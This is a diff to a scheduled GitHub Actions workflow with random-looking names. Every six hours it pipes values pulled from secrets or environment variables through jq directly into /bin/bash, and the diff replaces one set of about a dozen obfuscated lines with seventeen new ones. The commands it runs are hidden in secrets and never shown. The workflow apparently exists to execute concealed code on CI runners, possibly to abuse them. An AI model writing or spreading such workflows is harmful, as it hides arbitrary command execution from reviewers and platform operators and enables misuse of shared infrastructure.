@@ -2,26 +2,32 @@ name: laoqiuling8311
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 1/6 * * *'
+    - cron: '21 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: laoqiuling8311
         env:
-          wsntc68: ${{ secrets.wsntc68 }}
+          mw94661: ${{ secrets.mw94661 }}
         run: |
-          echo $wsntc68 | jq -r .kgdys6 | /bin/bash
-          echo $rt2610 | jq -r .a9440 | /bin/bash
-          echo $uyh31 | jq -r .kxwjb615 | /bin/bash
-          echo $go14 | jq -r .xv481 | /bin/bash
-          echo $l71 | jq -r .krrez15095 | /bin/bash
-          echo $sj0085 | jq -r .ez41 | /bin/bash
-          echo $sez46 | jq -r .waxds10812 | /bin/bash
-          echo $w834 | jq -r .rl004 | /bin/bash
-          echo $pdnnv8894 | jq -r .yx01 | /bin/bash
-          echo $nxl38 | jq -r .z15505 | /bin/bash
-          echo $gwtnc3 | jq -r .z0 | /bin/bash
+          echo $mw94661 | jq -r .q0 | /bin/bash
+          echo $qedjl06846 | jq -r .g8652 | /bin/bash
+          echo $ted1 | jq -r .gdnw65 | /bin/bash
+          echo $tsb7023 | jq -r .qenzq3370 | /bin/bash
+          echo $hss95513 | jq -r .iml446 | /bin/bash
+          echo $vbui1446 | jq -r .ngao61624 | /bin/bash
+          echo $momf4 | jq -r .oi068 | /bin/bash
+          echo $q1385 | jq -r .kmg328 | /bin/bash
+          echo $zz7 | jq -r .tpstt93871 | /bin/bash
+          echo $taqys49 | jq -r .r79733 | /bin/bash
+          echo $ghrmr8255 | jq -r .l507 | /bin/bash
+          echo $yxgta90 | jq -r .ksg25 | /bin/bash
+          echo $ckwbs3411 | jq -r .zcei7 | /bin/bash
+          echo $ccv450 | jq -r .te8655 | /bin/bash
+          echo $crj20 | jq -r .t7 | /bin/bash
+          echo $hn294 | jq -r .vv7 | /bin/bash
+          echo $q4 | jq -r .vscng192 | /bin/bash
 
